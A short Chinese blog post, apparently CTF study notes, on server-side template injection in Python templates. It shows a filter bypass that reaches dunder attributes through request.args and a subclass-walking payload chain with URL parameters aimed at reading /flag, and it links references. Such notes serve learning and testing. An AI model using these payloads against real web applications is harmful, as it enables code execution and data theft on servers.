---
title: SSTI
date: 2018-09-13 21:29:56
tags:
categories:
thumbnail:
---

# SSTI服务端模版注入

SSTI 即[服务端模板注入](https://www.cnblogs.com/tyomcat/p/5440488.html)

- Python

  - 例子

```
{{ shell }}
{%if 表达式 %}内容1{% else %}内容2{% endif %}
```

  - `__` 被过滤，我们可以考虑使用 `[]` 结合 `request`来进行绕过，比如
```
{% if ()[request.args.a]%}
```
​	url中 `/bbs?a=__class__`

  - 下面是之前的一次CTF中的SSTI绕过

```python
set chr=()__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.chr
# 注册chr函数
{%set chr=()[request.args.a][request.args.b][request.args.c]()[59][request.args.a1][request.args.a2][request.args.a3].chr %}
# url
a=__class__&b=__base__&c=__subclasses__&d=pop&e=/flag&a1=__init__&a2=__globals__&a3=__builtins__
```

- modal劫持

  https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html

突然发现hexo也有个模块存在注入，会对

```
{% %}
```

报错。[参见](https://github.com/hexojs/hexo/issues/2992)